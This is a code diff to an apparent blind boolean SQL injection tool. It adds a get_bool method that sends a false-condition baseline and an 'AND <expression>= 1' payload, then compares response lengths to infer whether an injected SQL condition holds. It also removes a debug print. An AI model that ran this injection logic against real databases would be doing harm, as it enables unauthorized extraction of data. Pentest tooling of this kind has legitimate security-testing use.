@@ -62,6 +62,30 @@ class BooleanInjector:
 
         return self.analyzer.responses_differ(r_true, r_false, DIFFER_LENGTH_BOOL)
 
+
+    def get_bool(
+        self, param: str, ctx: InjectionContext, expression: str
+    ) -> str:
+        """
+        Get the boolean value returned by the SQL query
+        """
+
+        # Baseline for a query containing a false condition. If another response differs from this,
+        # it would probably mean that the tested condition is true.
+        r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
+
+        payload = f"{ctx.prefix}AND {expression}= 1{ctx.suffix}"
+        response = self.requester.send({param: payload})
+
+        # Add the length of the payload as baseline response doesn't contain expression
+        diff_len = DIFFER_LENGTH_BOOL + len(payload)
+
+        # If different then the condition is right
+        if self.analyzer.responses_differ(r_false, response, diff_len):
+            return 'True'
+        return 'False'
+
+
     def get_number(
         self, param: str, ctx: InjectionContext, expression: str, high: int
     ) -> int:
@@ -83,7 +107,6 @@ class BooleanInjector:
 
             # To check if the name length is higher to the current mid value
             payload = f"{ctx.prefix}AND {expression}>{mid}{ctx.suffix}"
-            print("payyyy ----", payload)
             response = self.requester.send({param: payload})
             # Logger.debug(f"Diff len: {diff_len}")
 
